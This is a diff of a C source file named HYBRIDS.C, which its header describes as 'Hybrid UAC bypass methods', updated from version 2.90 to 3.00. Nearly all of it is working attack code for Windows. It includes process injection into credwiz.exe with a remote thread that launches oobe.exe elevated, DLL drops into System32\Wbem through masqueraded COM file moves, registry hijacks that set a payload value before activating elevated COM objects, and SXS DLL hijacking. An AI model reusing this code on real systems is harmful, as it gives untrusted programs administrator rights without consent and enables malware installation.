@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        14 July 2018
+*  DATE:        27 Aug 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -20,7 +20,7 @@
 #include "makecab.h"
 #include "manifest.h"
 
-ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
+LOAD_PARAMETERS_SIREFEF g_SirefefLoadParams;
 
 /*
 * ucmAvrfMethod
@@ -77,7 +77,6 @@ BOOL ucmAvrfMethod(
         //
         // Open IFEO key.
         //
-        RtlSecureZeroMemory(&ustr, sizeof(ustr));
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, L"\\REGISTRY\\");
         _strcat(szBuffer, T_IFEO);
@@ -194,7 +193,9 @@ BOOL ucmWinSATMethod(
 
         // Copy winsat to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
+#ifdef _DEBUG
             supDebugPrint(TEXT("ucmWinSATMethod"), GetLastError());
+#endif
             break;
         }
 
@@ -372,115 +373,33 @@ BOOL ucmMMCMethod(
 }
 
 /*
-* ucmElevatedLaunchProc
+* ucmxElevatedLaunchProc
 *
 * Purpose:
 *
 * Elevation procedure used by Sirefef method
 *
 */
-DWORD WINAPI ucmElevatedLaunchProc(
-    _In_ ELOAD_PARAMETERS_SIREFEF *elvpar
+DWORD WINAPI ucmxElevatedLaunchProc(
+    _In_ LOAD_PARAMETERS_SIREFEF *Params
 )
 {
-    SHELLEXECUTEINFOW   shexec;
-
-    if (elvpar == NULL)
-        return (DWORD)E_FAIL;
+    SHELLEXECUTEINFOW shexec;
 
     shexec.cbSize = sizeof(shexec);
     shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
     shexec.nShow = SW_SHOW;
-    shexec.lpVerb = elvpar->szVerb;
-    shexec.lpFile = elvpar->szTargetApp;
+    shexec.lpVerb = Params->szVerb;
+    shexec.lpFile = Params->szTargetApp;
     shexec.lpParameters = NULL;
     shexec.lpDirectory = NULL;
-    if (elvpar->xShellExecuteExW(&shexec))
+    if (Params->ShellExecuteExW(&shexec))
         if (shexec.hProcess != NULL) {
-            elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
-            elvpar->xCloseHandle(shexec.hProcess);
+            Params->WaitForSingleObject(shexec.hProcess, INFINITE);
+            Params->CloseHandle(shexec.hProcess);
         }
 
-    return S_OK;
-}
-
-/*
-* ucmSirefefBuildControlContext
-*
-* Purpose:
-*
-* Preparations for Sirefef method.
-*
-*/
-PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
-    VOID
-)
-{
-    BOOL                bCond = FALSE, bSuccess = FALSE;
-    ZA_CONTROL_CONTEXT *ctx = NULL;
-    SIZE_T              sz;
-    PVOID               Routine;
-
-
-    do {
-        sz = sizeof(ZA_CONTROL_CONTEXT);
-        NtAllocateVirtualMemory(NtCurrentProcess(), &ctx, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (ctx == NULL)
-            break;
-
-        RtlSecureZeroMemory(ctx, sz);
-
-        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CopyFileW");
-        if (Routine == NULL)
-            break;
-        ctx->pCopyFileW = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateRemoteThread");
-        if (Routine == NULL)
-            break;
-        ctx->pCreateRemoteThread = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WaitForSingleObject");
-        if (Routine == NULL)
-            break;
-        ctx->pWaitForSingleObject = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WriteProcessMemory");
-        if (Routine == NULL)
-            break;
-        ctx->pWriteProcessMemory = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtClose");
-        if (Routine == NULL)
-            break;
-        ctx->pNtClose = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtAllocateVirtualMemory");
-        if (Routine == NULL)
-            break;
-        ctx->pNtAllocateVirtualMemory = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtTerminateProcess");
-        if (Routine == NULL)
-            break;
-        ctx->pNtTerminateProcess = RtlEncodePointer(Routine);
-
-        ctx->SfCopyFile = RtlEncodePointer(ucmMasqueradedMoveFileCOM);
-        ctx->ElevatedProcedure = RtlEncodePointer(ucmElevatedLaunchProc);
-
-        ctx->ElevatedParameters = &g_ElevParamsSirefef;
-
-        ctx->RunProcessEx = RtlEncodePointer(supRunProcessEx);
-        bSuccess = TRUE;
-
-    } while (bCond);
-
-    if (bSuccess == FALSE) {
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &ctx, &sz, MEM_RELEASE);
-    }
-
-    return ctx;
+    return Params->RtlExitUserThread(STATUS_SUCCESS);
 }
 
 /*
@@ -489,6 +408,8 @@ PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
 * Purpose:
 *
 * Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
+*
+* Simplified, original Sirefef code do all copy operations from zombified process.
 *
 * Fixed in Windows 10 TH2
 *
@@ -499,117 +420,165 @@ BOOL ucmSirefefMethod(
 )
 {
     BOOL                      bResult = FALSE, bCond = FALSE;
-    ZA_CONTROL_CONTEXT       *za_ctx = NULL;
-    SIZE_T                    sz;
-    DWORD                     c;
+    SIZE_T                    memIO;
 
     HANDLE                    hProcess = NULL, hRemoteThread = NULL;
 
-    HINSTANCE                 selfmodule = GetModuleHandle(NULL);
-    PIMAGE_DOS_HEADER         pdosh = (PIMAGE_DOS_HEADER)selfmodule;
-    PIMAGE_FILE_HEADER        fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
-    PIMAGE_OPTIONAL_HEADER    opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
-    LPVOID                    remotebuffer = NULL, newEp, newDp;
+    HINSTANCE                 InjectorImageBase = GetModuleHandle(NULL);
+    PIMAGE_NT_HEADERS         NtHeaders = RtlImageNtHeader(InjectorImageBase);
+    LPVOID                    RemoteCode = NULL, newEp, newDp;
+    PLOAD_PARAMETERS_SIREFEF  LoadParams = &g_SirefefLoadParams;
+    PVOID                     LoadProc = ucmxElevatedLaunchProc;
 
+    WCHAR                     szB1[MAX_PATH * 2];
+    WCHAR                     szB2[MAX_PATH * 2];
+      
     do {
-        za_ctx = ucmSirefefBuildControlContext();
-        if (za_ctx == NULL)
+
+        //
+        // Drop Fubuki to the %temp% as NetUtils.dll
+        //
+        _strcpy(szB1, g_ctx.szTempDirectory);
+        _strcat(szB1, NETUTILS_DLL);
+        if (!supWriteBufferToFile(szB1, ProxyDll, ProxyDllSize))
             break;
 
-        //put Fubuki dll as netutils to %temp%
-        _strcpy(za_ctx->szSource, g_ctx.szTempDirectory);
-        _strcat(za_ctx->szSource, NETUTILS_DLL);
-        if (!supWriteBufferToFile(za_ctx->szSource, ProxyDll, ProxyDllSize))
+        //
+        // Move %temp%\NetUtils.dll to %SystemRoot%\System32\Wbem
+        //
+        _strcpy(szB2, g_ctx.szSystemDirectory);
+        _strcat(szB2, WBEM_DIR);
+        if (!ucmMasqueradedMoveFileCOM(szB1, szB2))
             break;
 
-        //move dll to wbem target folder
-        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
-        _strcat(za_ctx->szBuffer, WBEM_DIR);
-        za_ctx->SfCopyFile = RtlDecodePointer(za_ctx->SfCopyFile);
-        bResult = za_ctx->SfCopyFile(za_ctx->szSource, za_ctx->szBuffer);
-        if (!bResult)
+        //
+        // Copy %SystemRoot%\system32\credwiz.exe to %temp\oobe.exe
+        //
+        _strcpy(szB1, g_ctx.szSystemDirectory);
+        _strcat(szB1, CREDWIZ_EXE);
+        
+        _strcpy(szB2, g_ctx.szTempDirectory);
+        _strcat(szB2, OOBE_EXE);
+        
+        if (!CopyFile(szB1, szB2, FALSE))
             break;
 
-        //copy 1st stage target process
-        RtlSecureZeroMemory(za_ctx->szSource, sizeof(za_ctx->szSource));
-        _strcpy(za_ctx->szSource, g_ctx.szSystemDirectory);
-        _strcat(za_ctx->szSource, CREDWIZ_EXE);
+        //
+        // Move %temp%\oobe.exe to %SystemRoot%\system32\wbem
+        //      
+        _strcpy(szB1, g_ctx.szSystemDirectory);
+        _strcat(szB1, WBEM_DIR);
+        if (!ucmMasqueradedMoveFileCOM(szB2, szB1))
+            break;      
 
-        RtlSecureZeroMemory(za_ctx->szDest, sizeof(za_ctx->szDest));
-        _strcpy(za_ctx->szDest, g_ctx.szTempDirectory);
-        _strcat(za_ctx->szDest, OOBE_EXE);
-        za_ctx->pCopyFileW = RtlDecodePointer(za_ctx->pCopyFileW);
-        if (!za_ctx->pCopyFileW(za_ctx->szSource, za_ctx->szDest, FALSE))
-            break;
+        //
+        // Prepare shellcode params.
+        //
+        RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS_SIREFEF));
 
-        bResult = za_ctx->SfCopyFile(za_ctx->szDest, za_ctx->szBuffer);
-        if (!bResult)
-            break;
+        _strcpy(LoadParams->szVerb, RUNAS_VERB);
 
-        //setup basic shellcode routines
-        za_ctx->pWaitForSingleObject = RtlDecodePointer(za_ctx->pWaitForSingleObject);
-        za_ctx->ElevatedParameters->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
-        za_ctx->ElevatedParameters->xWaitForSingleObject = (pfnWaitForSingleObject)za_ctx->pWaitForSingleObject;
-        za_ctx->pNtClose = RtlDecodePointer(za_ctx->pNtClose);
-        za_ctx->ElevatedParameters->xCloseHandle = (pfnCloseHandle)za_ctx->pNtClose;
+        _strcat(szB1, OOBE_EXE);
+        _strncpy(LoadParams->szTargetApp, MAX_PATH, szB1, MAX_PATH);
 
-        //set shellcode 2nd stage target process
-        //c:\windows\system32\wbem\oobe.exe
-        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));
-        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
-        _strcat(za_ctx->szBuffer, WBEM_DIR);
-        _strcat(za_ctx->szBuffer, OOBE_EXE);
-        _strcpy(za_ctx->ElevatedParameters->szTargetApp, za_ctx->szBuffer);
-        _strcpy(za_ctx->ElevatedParameters->szVerb, RUNAS_VERB);
+        LoadParams->ShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(
+            g_ctx.hShell32, 
+            "ShellExecuteExW");
 
-        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));
+        LoadParams->WaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(
+            g_ctx.hKernel32, 
+            "WaitForSingleObject");
 
-        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
-        _strcat(za_ctx->szBuffer, CREDWIZ_EXE);
+        LoadParams->CloseHandle = (pfnCloseHandle)GetProcAddress(
+            g_ctx.hKernel32, 
+            "CloseHandle");
 
-        //run 1st stage target process
-        za_ctx->RunProcessEx = RtlDecodePointer(za_ctx->RunProcessEx);
-        hProcess = za_ctx->RunProcessEx(za_ctx->szBuffer, NULL, NULL, NULL);
+        LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(
+            g_ctx.hNtdll,
+            "RtlExitUserThread");
+
+        //
+        // Run host process.
+        //
+        _strcpy(szB1, g_ctx.szSystemDirectory);
+        _strcat(szB1, CREDWIZ_EXE);
+
+        hProcess = supRunProcessEx(szB1, NULL, NULL, NULL);
         if (hProcess == NULL)
             break;
 
-        za_ctx->pNtAllocateVirtualMemory = RtlDecodePointer(za_ctx->pNtAllocateVirtualMemory);
+        //
+        // Inject load code.
+        //
+        memIO = NtHeaders->OptionalHeader.SizeOfImage;
 
-        sz = (SIZE_T)opth->SizeOfImage;
-        za_ctx->pNtAllocateVirtualMemory(hProcess, &remotebuffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (remotebuffer == NULL)
+        if (!NT_SUCCESS(NtAllocateVirtualMemory(
+            hProcess,
+            &RemoteCode,
+            0,
+            &memIO,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE)))
+        {
+            break;
+        }
+
+        if (RemoteCode == NULL)
             break;
 
-        za_ctx->pWriteProcessMemory = RtlDecodePointer(za_ctx->pWriteProcessMemory);
-        if (!za_ctx->pWriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &sz))
+        memIO = NtHeaders->OptionalHeader.SizeOfImage;
+
+        if (!NT_SUCCESS(NtWriteVirtualMemory(
+            hProcess,
+            RemoteCode,
+            InjectorImageBase,
+            memIO,
+            &memIO)))
+        {
             break;
+        }
 
-        za_ctx->ElevatedProcedure = RtlDecodePointer(za_ctx->ElevatedProcedure);
+        newEp = (char *)RemoteCode + ((char *)LoadProc - (char *)InjectorImageBase);
+        newDp = (char *)RemoteCode + ((char *)LoadParams - (char *)InjectorImageBase);
 
-        newEp = (char *)remotebuffer + ((char *)za_ctx->ElevatedProcedure - (char *)selfmodule);
-        newDp = (char *)remotebuffer + ((char *)za_ctx->ElevatedParameters - (char *)selfmodule);
+        if (!NT_SUCCESS(RtlCreateUserThread(
+            hProcess,
+            NULL,
+            FALSE,
+            0,
+            0,
+            0,
+            (PUSER_THREAD_START_ROUTINE)newEp,
+            newDp,
+            &hRemoteThread,
+            NULL)))
+        {
+            break;
+        }
 
-        za_ctx->pCreateRemoteThread = RtlDecodePointer(za_ctx->pCreateRemoteThread);
-
-        hRemoteThread = za_ctx->pCreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
-        if (hRemoteThread) {
-            za_ctx->pWaitForSingleObject(hRemoteThread, INFINITE);
-            za_ctx->pNtClose(hRemoteThread);
-            bResult = TRUE;
+        bResult = (hRemoteThread != NULL);
+        if (bResult) {
+            WaitForSingleObject(hRemoteThread, INFINITE);
+            NtClose(hRemoteThread);
         }
 
     } while (bCond);
 
-    if (za_ctx != NULL) {
-        if (hProcess != NULL) {
-            za_ctx->pNtTerminateProcess = RtlDecodePointer(za_ctx->pNtTerminateProcess);
-            za_ctx->pNtTerminateProcess(hProcess, 0);
-            za_ctx->pNtClose(hProcess); //NtClose already decoded
-        }
-
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &za_ctx, &sz, MEM_RELEASE);
+    //
+    // Cleanup (system32\wbem data must be removed by payload code).
+    //
+    if (hProcess) {
+        TerminateProcess(hProcess, 0);
+        CloseHandle(hProcess);
     }
+
+    _strcpy(szB1, g_ctx.szTempDirectory);
+    _strcat(szB1, NETUTILS_DLL);
+    DeleteFile(szB1);
+
+    _strcpy(szB1, g_ctx.szTempDirectory);
+    _strcat(szB1, OOBE_EXE);
+    DeleteFile(szB1);
 
     return bResult;
 }
@@ -689,7 +658,6 @@ BOOL ucmGWX(
 )
 {
     BOOL   bResult = FALSE, cond = FALSE;
-    SIZE_T Dummy;
     WCHAR  szDest[MAX_PATH * 2];
     WCHAR  szSource[MAX_PATH * 2];
     WCHAR  szTargetApp[MAX_PATH * 2];
@@ -707,18 +675,22 @@ BOOL ucmGWX(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szDest)) {
+#ifdef _DEBUG
             supDebugPrint(TEXT("ucmGWX"), ERROR_ALREADY_EXISTS);
+#endif
             break;
         }
 
         //summon some unicorns, kongouXX.cd expected to be in the same directory as application
         Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
         if (Ptr == NULL) {
+#ifdef _DEBUG
             supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
+#endif
             break;
         }
 
-        Data = g_ctx.DecryptRoutine(Ptr, DataSize, &DecompressedBufferSize);
+        Data = g_ctx.DecompressRoutine(KONGOU_ID, Ptr, DataSize, &DecompressedBufferSize);
         if (Data == NULL)
             break;
 
@@ -761,13 +733,12 @@ BOOL ucmGWX(
     } while (cond);
 
     if (Data != NULL) {
-        Dummy = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &Data, &Dummy, MEM_RELEASE);
+        RtlSecureZeroMemory(Data, DecompressedBufferSize);
+        supVirtualFree(Data, NULL);
     }
 
     if (Ptr != NULL) {
-        Dummy = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &Ptr, &Dummy, MEM_RELEASE);
+        supVirtualFree(Ptr, NULL);
     }
     return bResult;
 }
@@ -917,7 +888,7 @@ BOOL ucmAutoElevateManifest(
         // Copy target to temp directory
         if (!CopyFile(szSource, szDest, FALSE))
             break;
-        
+
         _strcpy(szSource, szDest);
 
         // Copy target app to home
@@ -1191,7 +1162,9 @@ BOOL ucmInetMgrMethod(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szBuffer)) {
+#ifdef _DEBUG
             supDebugPrint(TEXT("ucmInetMgrMethod"), ERROR_ALREADY_EXISTS);
+#endif
             break;
         }
 
@@ -1287,15 +1260,21 @@ BOOL ucmSXSMethod(
         RtlSecureZeroMemory(szDst, sizeof(szDst));
 
         sz = UNICODE_STRING_MAX_BYTES;
-        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        
+        lpszFullDllPath = supVirtualAlloc(
+            &sz,
+            DEFAULT_ALLOCATION_TYPE,
+            DEFAULT_PROTECT_TYPE,
+            NULL);
+
         if (lpszFullDllPath == NULL)
             break;
 
         sctx.DllName = COMCTL32_DLL;
-        sctx.PartialPath = COMCTL32_SXS;
+        sctx.SxsKey = COMCTL32_SXS;
         sctx.FullDllPath = lpszFullDllPath;
 
-        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
+        if (!sxsFindLoaderEntry(&sctx))
             break;
 
         lpszDirectoryName = _filename(lpszFullDllPath);
@@ -1303,7 +1282,13 @@ BOOL ucmSXSMethod(
             break;
 
         sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
-        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        lpSxsPath = supVirtualAlloc(
+            &sz,
+            DEFAULT_ALLOCATION_TYPE,
+            DEFAULT_PROTECT_TYPE,
+            NULL);
+
         if (lpSxsPath == NULL)
             break;
 
@@ -1384,19 +1369,11 @@ BOOL ucmSXSMethod(
             _strcat(szDst, lpTargetApplication);
         }
         bResult = supRunProcess(szDst, NULL);
-        Sleep(1000);
 
     } while (bCond);
 
-    if (lpszFullDllPath) {
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
-    }
-
-    if (lpSxsPath) {
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
-    }
+    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
+    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
 
     return bResult;
 }
@@ -1555,17 +1532,17 @@ BOOL ucmUiAccessMethod(
             // Get the new entrypoint.
             //
             EntryPoint = PELoaderGetProcAddress(DllBase, FUBUKI_EXT_ENTRYPOINT);
-            if (EntryPoint == NULL)
-                break;
+            if (EntryPoint) {
 
-            //
-            // Set new entrypoint and recalculate checksum.
-            //
-            NtHeaders->OptionalHeader.AddressOfEntryPoint =
-                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
+                //
+                // Set new entrypoint and recalculate checksum.
+                //
+                NtHeaders->OptionalHeader.AddressOfEntryPoint =
+                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
 
-            NtHeaders->OptionalHeader.CheckSum =
-                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
+                NtHeaders->OptionalHeader.CheckSum =
+                    supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
+            }
 
             VirtualFree(DllBase, 0, MEM_RELEASE);
 
@@ -1802,11 +1779,12 @@ BOOL ucmSXSDccwMethod(
         //
         // Check if target app available. Maybe unavailable in server edition.
         //
+#ifndef _DEBUG
         _strcpy(szTarget, g_ctx.szSystemDirectory);
         _strcat(szTarget, DCCW_EXE);
         if (!PathFileExists(szTarget))
             break;
-
+#endif //_DEBUG
         //
         // Load GdiPlus in our address space to get it full path.
         //
@@ -1818,15 +1796,21 @@ BOOL ucmSXSDccwMethod(
             break;
 
         sz = UNICODE_STRING_MAX_BYTES;
-        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        lpszFullDllPath = supVirtualAlloc(
+            &sz, 
+            DEFAULT_ALLOCATION_TYPE, 
+            DEFAULT_PROTECT_TYPE, 
+            NULL);
+
         if (lpszFullDllPath == NULL)
             break;
 
         sctx.DllName = GDIPLUS_DLL;
-        sctx.PartialPath = GDIPLUS_SXS;
+        sctx.SxsKey = GDIPLUS_SXS;
         sctx.FullDllPath = lpszFullDllPath;
 
-        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
+        if (!sxsFindLoaderEntry(&sctx))
             break;
 
         lpszDirectoryName = _filename(lpszFullDllPath);
@@ -1834,7 +1818,13 @@ BOOL ucmSXSDccwMethod(
             break;
 
         sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
-        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        lpSxsPath = supVirtualAlloc(
+            &sz,
+            DEFAULT_ALLOCATION_TYPE,
+            DEFAULT_PROTECT_TYPE,
+            NULL);
+
         if (lpSxsPath == NULL)
             break;
 
@@ -1855,7 +1845,12 @@ BOOL ucmSXSDccwMethod(
         _strcpy(szBuffer, g_ctx.szTempDirectory);
         _strcat(szBuffer, GDIPLUS_DLL);
 
-        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, lpSxsPath);
+        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(
+            szBuffer, 
+            ProxyDll, 
+            ProxyDllSize, 
+            lpSxsPath);
+
         if (!bWusaNeedCleanup)
             break;
 
@@ -1879,23 +1874,10 @@ BOOL ucmSXSDccwMethod(
     //
     // Cleanup resources.
     //
-
-    if (hGdiPlus != NULL)
-        FreeLibrary(hGdiPlus);
-
-    if (lpszFullDllPath) {
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
-    }
-
-    if (lpSxsPath) {
-        sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
-    }
-
-    if (bWusaNeedCleanup) {
-        ucmWusaCabinetCleanup();
-    }
+    if (hGdiPlus != NULL) FreeLibrary(hGdiPlus);
+    if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
+    if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
+    if (bWusaNeedCleanup) ucmWusaCabinetCleanup();
 
     return bResult;
 }
@@ -2017,15 +1999,15 @@ BOOL ucmCorProfilerMethod(
 * Bypass UAC using FwCplLua undocumented COM interface and mscfile registry hijack.
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
-* Fixed in Windows 10 RS4
+* Produced mixed results since Windows 10 RS4.
 *
 */
 BOOL ucmFwCplLuaMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    HRESULT          r = E_FAIL;
-    BOOL             bCond = FALSE, bSymLinkCleanup = FALSE;
+    HRESULT          r = E_FAIL, hr_init;
+    BOOL             bCond = FALSE, bSymLinkCleanup = FALSE, bApprove = FALSE;
 
     LRESULT          lResult;
     HKEY             hKey = NULL;
@@ -2033,24 +2015,28 @@ BOOL ucmFwCplLuaMethod(
 
     DWORD            dwKeyDisposition = 0;
 
-    IID              xIIDFwCplLua;
     IFwCplLua       *FwCplLua = NULL;
 
     WCHAR            szKey[MAX_PATH + 1];
 
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
     do {
 
 #ifdef _DEBUG
-        g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
+        g_ctx.MethodExecuteType = ucmExTypeDefault;
 #endif
 
-        RtlSecureZeroMemory(szKey, sizeof(szKey));
+        //
+        // Potential fix check.
+        //
+        if (supIsConsentApprovedInterface(T_CLSID_FwCplLua, &bApprove)) {
+            if (bApprove == FALSE)
+                if (ucmShowQuestion(UACFIX) != IDYES)
+                    break;
+        }
 
-        //
-        // Query IID for FwCplLua.
-        //
-        if (IIDFromString(T_IID_IFwCplLua, &xIIDFwCplLua) != S_OK)
-            break;
+        RtlSecureZeroMemory(szKey, sizeof(szKey));
 
         sz = _strlen(lpszPayload);
         if (sz == 0)
@@ -2078,24 +2064,35 @@ BOOL ucmFwCplLuaMethod(
         // Set "Default" value as our payload.
         // 
         sz = (1 + sz) * sizeof(WCHAR);
-        if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
 
-            if (NT_SUCCESS(wdRegSetValueIndirectHKCU(szKey, NULL, lpszPayload, (ULONG)sz))) {
+        switch (g_ctx.MethodExecuteType) {
+
+        case ucmExTypeRegSymlink:
+
+            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
+                szKey,
+                NULL,
+                lpszPayload,
+                (ULONG)sz)))
+            {
                 bSymLinkCleanup = TRUE;
                 lResult = ERROR_SUCCESS;
             }
 
-        }
-        else {
-          
+            break;
+
+        case ucmExTypeDefault:
+        default:
+
             lResult = RegSetValueEx(
                 hKey,
                 TEXT(""),
                 0,
                 REG_SZ,
                 (BYTE*)lpszPayload,
-                (DWORD)sz);          
+                (DWORD)sz);
 
+            break;
         }
 
         RegCloseKey(hKey);
@@ -2107,17 +2104,17 @@ BOOL ucmFwCplLuaMethod(
         //
         // Get elevated COM object for FwCplLua interface.
         //
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_FwCplLua,
+            &IID_IFwCplLua,
             CLSCTX_LOCAL_SERVER,
-            &xIIDFwCplLua,
             &FwCplLua);
 
         if (r != S_OK)
             break;
 
         if (FwCplLua == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -2136,19 +2133,20 @@ BOOL ucmFwCplLuaMethod(
         FwCplLua->lpVtbl->Release(FwCplLua);
     }
 
+    if (hr_init == S_OK)
+        CoUninitialize();
+
     //
     // Remove symlink.
     //
-    if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
-        if (bSymLinkCleanup)
-            wdRemoveRegLinkHKCU();
-    }
+    if (bSymLinkCleanup)
+        supRemoveRegLinkHKCU();
 
     //
     // Remove key with all subkeys.
     //
     if (dwKeyDisposition == REG_CREATED_NEW_KEY)
-        supDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
+        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
 
     return SUCCEEDED(r);
 }
@@ -2170,17 +2168,28 @@ BOOL ucmDccwCOMMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    HRESULT          r = E_FAIL;
-    BOOL             bCond = FALSE;
+    HRESULT          r = E_FAIL, hr_init;
+    BOOL             bCond = FALSE, bIntApproved1 = FALSE, bIntApproved2 = FALSE;
 
     SIZE_T           sz = 0;
 
-    IID              xIID_ICMLuaUtil;
-    IID              xIID_IColorDataProxy;
     ICMLuaUtil      *CMLuaUtil = NULL;
     IColorDataProxy *ColorDataProxy = NULL;
 
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
     do {
+        //
+        // Potential fix check.
+        //
+        if (supIsConsentApprovedInterface(T_CLSID_ColorDataProxy, &bIntApproved1)) {
+            if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bIntApproved2))
+                if ((bIntApproved1 == FALSE) || (bIntApproved2 == FALSE)) {
+                    if (ucmShowQuestion(UACFIX) != IDYES)
+                        break;
+                }
+        }
+
 
         sz = _strlen(lpszPayload);
         if (sz == 0)
@@ -2189,14 +2198,10 @@ BOOL ucmDccwCOMMethod(
         //
         // Create elevated COM object for CMLuaUtil.
         //
-        if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
-            break;
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_CMSTPLUA,
+            &IID_ICMLuaUtil,
             CLSCTX_LOCAL_SERVER,
-            &xIID_ICMLuaUtil,
             &CMLuaUtil);
 
         if (r != S_OK) {
@@ -2204,7 +2209,7 @@ BOOL ucmDccwCOMMethod(
         }
 
         if (CMLuaUtil == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -2219,28 +2224,24 @@ BOOL ucmDccwCOMMethod(
 
         if (FAILED(r)) {
             break;
-        }   
+        }
 
         //
         // Create elevated COM object for ColorDataProxy.
         //
-        if (IIDFromString(T_IID_IColorDataProxy, &xIID_IColorDataProxy) != S_OK) {
-            break;
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_ColorDataProxy,
+            &IID_IColorDataProxy,
             CLSCTX_LOCAL_SERVER,
